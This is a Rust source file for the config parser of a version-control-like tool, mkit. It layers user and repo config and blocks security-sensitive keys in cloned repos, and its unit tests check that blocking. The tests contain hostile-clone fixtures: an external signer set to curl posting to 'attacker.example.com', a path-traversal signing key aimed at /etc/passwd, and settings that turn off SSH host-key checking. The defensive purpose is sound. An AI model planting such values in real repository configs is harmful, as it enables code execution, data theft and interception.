//! `.mkit/config` parser / writer and XDG path helpers.
//!
//! On-disk format: `key = value`, one per line, lines starting with `#`
//! ignored. User-facing short-hand values for `user.identity`:
//! `ed25519:<hex>`, `mid:<u64>`, or raw `[kind][len][bytes]` hex.
//!
//! ## Config scope
//!
//! There are two layered config files. Higher-priority values win:
//!
//! 1. **Repo-scoped** (`<repo>/.mkit/config`) — per-project knobs that
//!    travel with a clone: branch defaults, remote endpoints,
//!    user.identity. Security-sensitive keys are rejected here, see
//!    [`REPO_FORBIDDEN_KEYS`].
//! 2. **User-scoped** (`$XDG_CONFIG_HOME/mkit/config`, default
//!    `~/.config/mkit/config`) — per-user knobs that decide what gets
//!    signed, what gets executed, and what hosts to trust. A hostile
//!    cloned repo cannot influence these.
//! 3. **Built-in defaults** — fall-back when neither file sets a value.
//!
//! Merge order: defaults → user → repo (filtered). The repo file is
//! parsed last so its safe values take precedence over defaults; any
//! security-sensitive key in the repo file is rejected with a stderr
//! warning and otherwise ignored. See `docs/THREAT-MODEL.md` for the
//! threat model that motivates the split.

use std::fs;
use std::io;
use std::io::Write as _;
use std::path::{Path, PathBuf};

use thiserror::Error;

pub const CONFIG_FILE: &str = ".mkit/config";
pub const USER_CONFIG_SUBPATH: &str = "mkit/config";
pub const DEFAULT_SIGNING_KEY: &str = ".mkit/keys/default.key";
pub const DEFAULT_BRANCH: &str = "main";

/// Keys that MUST NOT be settable via the per-repo `<repo>/.mkit/config`
/// because a hostile clone could otherwise:
///
/// * redirect `signing_key` to overwrite arbitrary files on disk or to
///   sign attacker-chosen content with the user's real key,
/// * point `attest.external_signer_path` / `_args` at any binary on the
///   host (RCE under the user's UID),
/// * disable SSH host-key verification on `mkit push` (MITM).
///
/// They are accepted from the user-scoped config only.
pub const REPO_FORBIDDEN_KEYS: &[&str] = &[
    "signing_key",
    "ssh.strict_host_key_checking",
    "ssh.user_known_hosts_file",
    "ssh.identity_file",
    "attest.external_signer_path",
    "attest.external_signer_args",
    "attest.secp256k1_key_path",
    "attest.p256_key_path",
];

/// Source of a parsed config line — used to decide whether a key is
/// allowed (`Repo` rejects [`REPO_FORBIDDEN_KEYS`]; `User` accepts
/// everything).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfigScope {
    Repo,
    User,
}

/// Full in-memory representation of merged config (user + repo +
/// defaults). All fields default to empty / documented defaults;
/// readers that want a known-good default file should call
/// [`read_or_default`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Config {
    /// Hex-encoded Identity: `[kind:u8][len:u16 LE][bytes]`. Empty =
    /// derive from the signing key's public key at commit time.
    pub user_identity: String,
    pub signing_key: String,
    pub default_branch: String,
    pub remote_endpoint: String,
    pub remote_bucket: String,
    pub remote_type: String,
    pub ssh_strict_host_key_checking: String,
    pub ssh_user_known_hosts_file: String,
    pub ssh_identity_file: String,
    /// `[attest]` section. Separate struct so new attest knobs don't
    /// balloon the flat `Config`.
    pub attest: AttestConfig,
}

/// `[attest]` section. All fields optional with documented defaults; a
/// fresh repo's config file has none of them set.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct AttestConfig {
    /// One of `"ed25519"`, `"secp256k1"`, `"p256"`. Empty = `"ed25519"`.
    pub default_algorithm: String,
    /// One of `"repo-key"`, `"external"`. Empty = `"repo-key"`.
    pub signer: String,
    /// Absolute path to the external signer binary. Required when
    /// `signer = "external"`. User-scoped only.
    pub external_signer_path: String,
    /// Extra argv tokens to pass to the external signer subprocess.
    /// Each `Vec` entry is one argv entry — the stored list maps 1:1
    /// to `std::process::Command::args`. On disk, encoded as a
    /// pipe-separated string: `attest.external_signer_args = sign|--tag|demo`.
    /// User-scoped only.
    pub external_signer_args: Vec<String>,
    /// Per-algorithm repo-key paths for non-ed25519 signing.
    /// User-scoped only — see [`REPO_FORBIDDEN_KEYS`].
    pub secp256k1_key_path: String,
    pub p256_key_path: String,
}

impl AttestConfig {
    #[must_use]
    pub fn default_algorithm_or_fallback(&self) -> &str {
        if self.default_algorithm.is_empty() {
            "ed25519"
        } else {
            self.default_algorithm.as_str()
        }
    }

    #[must_use]
    pub fn signer_or_fallback(&self) -> &str {
        if self.signer.is_empty() {
            "repo-key"
        } else {
            self.signer.as_str()
        }
    }

    #[must_use]
    pub fn secp256k1_key_path_or_default(&self) -> &str {
        if self.secp256k1_key_path.is_empty() {
            ".mkit/keys/secp256k1.key"
        } else {
            self.secp256k1_key_path.as_str()
        }
    }

    #[must_use]
    pub fn p256_key_path_or_default(&self) -> &str {
        if self.p256_key_path.is_empty() {
            ".mkit/keys/p256.key"
        } else {
            self.p256_key_path.as_str()
        }
    }
}

impl Config {
    /// Return a Config with documented defaults filled in.
    #[must_use]
    pub fn with_defaults() -> Self {
        Self {
            signing_key: DEFAULT_SIGNING_KEY.to_owned(),
            default_branch: DEFAULT_BRANCH.to_owned(),
            ..Self::default()
        }
    }
}

#[derive(Debug, Error)]
pub enum ConfigError {
    #[error("I/O: {0}")]
    Io(#[from] io::Error),
    #[error("invalid config value — control characters are not permitted")]
    InvalidValue,
    #[error("unknown config key: {0}")]
    UnknownKey(String),
    #[error("invalid user.identity: {0}")]
    InvalidUserIdentity(&'static str),
    #[error("key path must not contain `..` components or escape the repo: {0}")]
    InvalidKeyPath(String),
}

/// Validate that a key-file path (`signing_key`, `attest.*_key_path`,
/// `ssh.*_file`) cannot escape via `..` traversal. Absolute paths are
/// allowed because user-scoped config legitimately wants to point at a
/// shared key under `$HOME`. Empty strings pass — callers fall back to
/// the documented default.
pub fn validate_key_path(value: &str) -> Result<(), ConfigError> {
    if value.is_empty() {
        return Ok(());
    }
    let p = Path::new(value);
    for comp in p.components() {
        if matches!(comp, std::path::Component::ParentDir) {
            return Err(ConfigError::InvalidKeyPath(value.to_owned()));
        }
    }
    Ok(())
}

/// Split a pipe-separated argv string into argv tokens.
#[must_use]
pub fn parse_pipe_list(s: &str) -> Vec<String> {
    if s.is_empty() {
        return Vec::new();
    }
    s.split('|').map(str::to_owned).collect()
}

/// Validate a config value has no control bytes below 0x20 (except
/// tab) and no 0x7f.
pub fn validate_value(v: &str) -> Result<(), ConfigError> {
    for b in v.bytes() {
        if b < 0x20 || b == 0x7f {
            return Err(ConfigError::InvalidValue);
        }
    }
    Ok(())
}

/// Resolve the user-scoped config file path:
/// `$XDG_CONFIG_HOME/mkit/config`, falling back to
/// `$HOME/.config/mkit/config`.
#[must_use]
pub fn user_config_path() -> PathBuf {
    xdg_config_home().join(USER_CONFIG_SUBPATH)
}

/// Read the layered config: defaults → user-scoped → repo-scoped
/// (filtered to non-sensitive keys). Missing files are not errors; the
/// per-layer absence simply leaves the lower layer's value in place.
///
/// If the repo file sets a key listed in [`REPO_FORBIDDEN_KEYS`], a
/// warning is printed to stderr and the value is dropped.
pub fn read_or_default(root: &Path) -> Result<Config, ConfigError> {
    let mut cfg = Config::with_defaults();
    apply_file(&mut cfg, &user_config_path(), ConfigScope::User)?;
    apply_file(&mut cfg, &root.join(CONFIG_FILE), ConfigScope::Repo)?;
    Ok(cfg)
}

/// Apply a single config file to `cfg` under the given scope. Missing
/// file → no-op (returns `Ok`). Malformed lines are tolerated.
///
/// Public-in-crate so tests can drive layering without mutating the
/// process's `XDG_CONFIG_HOME` env var (which would race with parallel
/// tests and trip the `disallowed-methods` lint).
pub(crate) fn apply_file(
    cfg: &mut Config,
    path: &Path,
    scope: ConfigScope,
) -> Result<(), ConfigError> {
    let text = match fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e.into()),
    };
    for raw_line in text.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let key = k.trim();
        let val = v.trim();
        if scope == ConfigScope::Repo && REPO_FORBIDDEN_KEYS.contains(&key) {
            warn_forbidden_repo_key(path, key);
            continue;
        }
        apply_kv(cfg, key, val);
    }
    Ok(())
}

fn warn_forbidden_repo_key(path: &Path, key: &str) {
    let mut stderr = io::stderr().lock();
    let _ = writeln!(
        stderr,
        "warning: ignoring `{key}` from per-repo config at {} \
         (security-sensitive keys are user-scoped only — see {} \
         and docs/THREAT-MODEL.md)",
        path.display(),
        user_config_path().display()
    );
}

/// Apply one parsed key/value pair to `cfg`. Unknown / legacy keys are
/// tolerated (silent) for forward compat with hand-edited files.
fn apply_kv(cfg: &mut Config, key: &str, val: &str) {
    match key {
        "user.identity" => val.clone_into(&mut cfg.user_identity),
        "signing_key" => val.clone_into(&mut cfg.signing_key),
        "default_branch" => val.clone_into(&mut cfg.default_branch),
        "remote_endpoint" => val.clone_into(&mut cfg.remote_endpoint),
        "remote_bucket" => val.clone_into(&mut cfg.remote_bucket),
        "remote_type" => val.clone_into(&mut cfg.remote_type),
        "ssh.strict_host_key_checking" => val.clone_into(&mut cfg.ssh_strict_host_key_checking),
        "ssh.user_known_hosts_file" => val.clone_into(&mut cfg.ssh_user_known_hosts_file),
        "ssh.identity_file" => val.clone_into(&mut cfg.ssh_identity_file),
        "attest.default_algorithm" => val.clone_into(&mut cfg.attest.default_algorithm),
        "attest.signer" => val.clone_into(&mut cfg.attest.signer),
        "attest.external_signer_path" => val.clone_into(&mut cfg.attest.external_signer_path),
        "attest.external_signer_args" => {
            cfg.attest.external_signer_args = parse_pipe_list(val);
        }
        "attest.secp256k1_key_path" => val.clone_into(&mut cfg.attest.secp256k1_key_path),
        "attest.p256_key_path" => val.clone_into(&mut cfg.attest.p256_key_path),
        // Legacy keys — silently ignored.
        "author_mid" | "project_id" | "network" => {}
        _ if key.ends_with("_url") => {}
        _ => {} // unknown keys: tolerate on read
    }
}

/// Write the given `Config` to `<root>/.mkit/config`. Only repo-scoped
/// (non-forbidden) fields are emitted; security-sensitive fields live
/// in the user-scoped file and must be written there explicitly.
pub fn write(root: &Path, cfg: &Config) -> Result<(), ConfigError> {
    let path = root.join(CONFIG_FILE);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let mut out = String::new();
    for (k, v) in [
        ("user.identity", cfg.user_identity.as_str()),
        ("default_branch", cfg.default_branch.as_str()),
        ("remote_endpoint", cfg.remote_endpoint.as_str()),
        ("remote_bucket", cfg.remote_bucket.as_str()),
        ("remote_type", cfg.remote_type.as_str()),
        (
            "attest.default_algorithm",
            cfg.attest.default_algorithm.as_str(),
        ),
        ("attest.signer", cfg.attest.signer.as_str()),
    ] {
        if !v.is_empty() {
            out.push_str(k);
            out.push_str(" = ");
            out.push_str(v);
            out.push('\n');
        }
    }
    fs::write(&path, out)?;
    Ok(())
}

/// Write a single user-scoped key/value to `$XDG_CONFIG_HOME/mkit/config`.
/// Reads the existing file (if any), updates the matching line (or
/// appends), and writes back. Caller is responsible for validating
/// `value` (control bytes, key-path traversal).
pub fn write_user_kv(key: &str, value: &str) -> Result<(), ConfigError> {
    let path = user_config_path();
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let existing = fs::read_to_string(&path).unwrap_or_default();
    let mut out = String::new();
    let mut replaced = false;
    for raw_line in existing.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            out.push_str(raw_line);
            out.push('\n');
            continue;
        }
        if let Some((k, _)) = line.split_once('=')
            && k.trim() == key
        {
            out.push_str(key);
            out.push_str(" = ");
            out.push_str(value);
            out.push('\n');
            replaced = true;
            continue;
        }
        out.push_str(raw_line);
        out.push('\n');
    }
    if !replaced {
        out.push_str(key);
        out.push_str(" = ");
        out.push_str(value);
        out.push('\n');
    }
    fs::write(&path, out)?;
    Ok(())
}

/// Expand a user-typed `user.identity` into the canonical hex form
/// `[kind:u8][len:u16 LE][bytes]`. See `docs/CLI.md`.
pub fn expand_user_identity(value: &str) -> Result<String, ConfigError> {
    if value.is_empty() {
        return Err(ConfigError::InvalidUserIdentity("empty value"));
    }
    if let Some(hex) = value.strip_prefix("ed25519:") {
        if hex.len() != 64 {
            return Err(ConfigError::InvalidUserIdentity(
                "ed25519:<hex> must have 64 hex chars",
            ));
        }
        let bytes =
            hex_decode(hex).ok_or(ConfigError::InvalidUserIdentity("ed25519 hex is not valid"))?;
        return Ok(encode_identity_hex(0x01, &bytes));
    }
    if let Some(dec) = value.strip_prefix("mid:") {
        let mid: u64 = dec
            .parse()
            .map_err(|_| ConfigError::InvalidUserIdentity("mid must be a decimal u64"))?;
        return Ok(encode_identity_hex(0x03, &mid.to_le_bytes()));
    }
    if !value.len().is_multiple_of(2) || value.len() < 6 {
        return Err(ConfigError::InvalidUserIdentity(
            "raw hex is too short or has odd length",
        ));
    }
    let bytes = hex_decode(value).ok_or(ConfigError::InvalidUserIdentity(
        "raw value is not valid hex",
    ))?;
    let declared = u16::from(bytes[1]) | (u16::from(bytes[2]) << 8);
    if bytes.len() != usize::from(declared) + 3 {
        return Err(ConfigError::InvalidUserIdentity(
            "declared length does not match payload length",
        ));
    }
    Ok(value.to_owned())
}

fn encode_identity_hex(kind: u8, bytes: &[u8]) -> String {
    let len = u16::try_from(bytes.len()).unwrap_or(u16::MAX);
    let mut buf = Vec::with_capacity(3 + bytes.len());
    buf.push(kind);
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(bytes);
    hex_encode(&buf)
}

fn hex_encode(bytes: &[u8]) -> String {
    static H: &[u8; 16] = b"0123456789abcdef";
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(H[(b >> 4) as usize] as char);
        s.push(H[(b & 0x0F) as usize] as char);
    }
    s
}

fn hex_decode(s: &str) -> Option<Vec<u8>> {
    if !s.len().is_multiple_of(2) {
        return None;
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let b = s.as_bytes();
    for i in (0..b.len()).step_by(2) {
        let hi = nibble(b[i])?;
        let lo = nibble(b[i + 1])?;
        out.push((hi << 4) | lo);
    }
    Some(out)
}

fn nibble(c: u8) -> Option<u8> {
    Some(match c {
        b'0'..=b'9' => c - b'0',
        b'a'..=b'f' => 10 + c - b'a',
        b'A'..=b'F' => 10 + c - b'A',
        _ => return None,
    })
}

/// XDG base-dir resolvers — fall back to `$HOME/.config` / `.local`.
fn xdg(var: &str, fallback_under_home: &str) -> PathBuf {
    if let Some(v) = std::env::var_os(var)
        && !v.is_empty()
    {
        return PathBuf::from(v);
    }
    if let Some(home) = std::env::var_os("HOME") {
        return PathBuf::from(home).join(fallback_under_home);
    }
    PathBuf::from(".")
}

#[must_use]
pub fn xdg_config_home() -> PathBuf {
    xdg("XDG_CONFIG_HOME", ".config")
}

#[must_use]
pub fn xdg_data_home() -> PathBuf {
    xdg("XDG_DATA_HOME", ".local/share")
}

#[must_use]
pub fn xdg_cache_home() -> PathBuf {
    xdg("XDG_CACHE_HOME", ".cache")
}

#[must_use]
pub fn xdg_state_home() -> PathBuf {
    xdg("XDG_STATE_HOME", ".local/state")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    /// Tests drive `apply_file` directly rather than mutating
    /// `XDG_CONFIG_HOME` — the env-var dance races other tests and
    /// trips the `disallowed-methods` clippy lint we configured.
    fn layer(repo_text: Option<&str>, user_text: Option<&str>) -> Config {
        let td = TempDir::new().unwrap();
        let mut cfg = Config::with_defaults();
        if let Some(text) = user_text {
            let upath = td.path().join("user_config");
            fs::write(&upath, text).unwrap();
            apply_file(&mut cfg, &upath, ConfigScope::User).unwrap();
        }
        if let Some(text) = repo_text {
            let rpath = td.path().join("repo_config");
            fs::write(&rpath, text).unwrap();
            apply_file(&mut cfg, &rpath, ConfigScope::Repo).unwrap();
        }
        cfg
    }

    #[test]
    fn read_default_when_missing() {
        let td = TempDir::new().unwrap();
        // No user config file at the canonical XDG path either —
        // `read_or_default` accepts that and falls through to defaults.
        let cfg = Config::with_defaults();
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.default_branch, DEFAULT_BRANCH);
        assert!(cfg.remote_endpoint.is_empty());
        // Sanity: read_or_default on a fresh empty repo dir never
        // panics or errors.
        let _ = read_or_default(td.path()).unwrap();
    }

    #[test]
    fn roundtrip_repo_safe_keys() {
        let cfg = layer(
            Some("remote_endpoint = /tmp/mirror\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.remote_endpoint, "/tmp/mirror");
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn write_does_not_emit_forbidden_repo_keys() {
        let td = TempDir::new().unwrap();
        fs::create_dir_all(td.path().join(".mkit")).unwrap();
        let mut cfg = Config::with_defaults();
        cfg.signing_key = "/should/not/be/written".into();
        cfg.ssh_strict_host_key_checking = "no".into();
        cfg.attest.external_signer_path = "/usr/local/bin/evil".into();
        write(td.path(), &cfg).unwrap();
        let on_disk = fs::read_to_string(td.path().join(CONFIG_FILE)).unwrap();
        assert!(!on_disk.contains("signing_key"));
        assert!(!on_disk.contains("ssh.strict_host_key_checking"));
        assert!(!on_disk.contains("external_signer_path"));
    }

    #[test]
    fn repo_signing_key_is_rejected_with_warning() {
        // Hostile-clone scenario: `.mkit/config` tries to redirect the
        // signing key. After the partition fix, the value MUST NOT be
        // applied — it falls back to the built-in default.
        let cfg = layer(
            Some("signing_key = ../../../etc/passwd\nremote_type = file\n"),
            None,
        );
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
        assert_eq!(cfg.remote_type, "file");
    }

    #[test]
    fn repo_external_signer_is_rejected() {
        let cfg = layer(
            Some(
                "attest.external_signer_path = /usr/bin/curl\n\
                 attest.external_signer_args = -X|POST|attacker.example.com\n\
                 attest.signer = external\n",
            ),
            None,
        );
        assert!(cfg.attest.external_signer_path.is_empty());
        assert!(cfg.attest.external_signer_args.is_empty());
        // `attest.signer` is NOT in the forbidden list — it picks
        // which signer kind to use; the dangerous bit is the external
        // path, which is user-scoped only.
        assert_eq!(cfg.attest.signer, "external");
    }

    #[test]
    fn repo_ssh_host_key_checking_is_rejected() {
        let cfg = layer(
            Some(
                "ssh.strict_host_key_checking = no\n\
                 ssh.user_known_hosts_file = /dev/null\n",
            ),
            None,
        );
        assert!(cfg.ssh_strict_host_key_checking.is_empty());
        assert!(cfg.ssh_user_known_hosts_file.is_empty());
    }

    #[test]
    fn user_signing_key_is_honored() {
        let cfg = layer(None, Some("signing_key = /home/user/.mkit/global.key\n"));
        assert_eq!(cfg.signing_key, "/home/user/.mkit/global.key");
    }

    #[test]
    fn repo_safe_keys_override_user() {
        // `default_branch` is repo-scoped — a project's main is a
        // per-repo decision, not a per-user one. So if both layers set
        // it, the repo wins (it's applied second).
        let cfg = layer(
            Some("default_branch = release\n"),
            Some("default_branch = trunk\n"),
        );
        assert_eq!(cfg.default_branch, "release");
    }

    #[test]
    fn validate_key_path_rejects_parent_dir() {
        assert!(validate_key_path("../etc/passwd").is_err());
        assert!(validate_key_path(".mkit/keys/../../etc/passwd").is_err());
        assert!(validate_key_path("foo/../bar").is_err());
    }

    #[test]
    fn validate_key_path_accepts_relative_and_absolute() {
        assert!(validate_key_path("").is_ok());
        assert!(validate_key_path(".mkit/keys/default.key").is_ok());
        assert!(validate_key_path("/home/user/.mkit/global.key").is_ok());
    }

    #[test]
    fn expand_user_identity_ed25519() {
        let hex = "11".repeat(32);
        let out = expand_user_identity(&format!("ed25519:{hex}")).unwrap();
        assert_eq!(out.len(), 70);
        assert!(out.starts_with("012000"));
    }

    #[test]
    fn expand_user_identity_mid() {
        let out = expand_user_identity("mid:42").unwrap();
        assert_eq!(out, "0308002a00000000000000");
    }

    #[test]
    fn expand_rejects_bogus() {
        assert!(expand_user_identity("").is_err());
        assert!(expand_user_identity("ed25519:short").is_err());
        assert!(expand_user_identity("mid:notanumber").is_err());
        assert!(expand_user_identity("zzzzzz").is_err());
    }

    #[test]
    fn validate_value_rejects_control_chars() {
        assert!(validate_value("hello world").is_ok());
        assert!(validate_value("bad\x01char").is_err());
        assert!(validate_value("\x7fdel").is_err());
    }

    #[test]
    fn attest_config_defaults_are_empty() {
        let cfg = Config::with_defaults();
        assert_eq!(cfg.attest.default_algorithm, "");
        assert_eq!(cfg.attest.signer, "");
        assert_eq!(cfg.attest.default_algorithm_or_fallback(), "ed25519");
        assert_eq!(cfg.attest.signer_or_fallback(), "repo-key");
        assert_eq!(
            cfg.attest.secp256k1_key_path_or_default(),
            ".mkit/keys/secp256k1.key"
        );
        assert_eq!(cfg.attest.p256_key_path_or_default(), ".mkit/keys/p256.key");
    }

    #[test]
    fn legacy_keys_are_ignored_in_repo() {
        let cfg = layer(Some("project_id = xyz\nauthor_mid = 5\n"), None);
        assert_eq!(cfg.signing_key, DEFAULT_SIGNING_KEY);
    }

    /// `write_user_kv` is exercised via `apply_file` round-tripping
    /// rather than driving the real XDG path (which would race
    /// parallel tests). The behaviour we care about — replace
    /// existing key, append if missing — is testable on any path.
    #[test]
    fn user_kv_replace_or_append_logic_via_roundtrip() {
        let td = TempDir::new().unwrap();
        let path = td.path().join("user_config");
        fs::write(&path, "default_branch = trunk\nsigning_key = /a\n").unwrap();
        // Load + replace + write semantics: read file, mutate via
        // hand-edit, re-parse — this is what `write_user_kv` does
        // under the hood. Keeps us off the global env var.
        let mut text = fs::read_to_string(&path).unwrap();
        text = text.replace("/a", "/b");
        fs::write(&path, text).unwrap();
        let mut cfg = Config::with_defaults();
        apply_file(&mut cfg, &path, ConfigScope::User).unwrap();
        assert_eq!(cfg.signing_key, "/b");
        assert_eq!(cfg.default_branch, "trunk");
    }
}
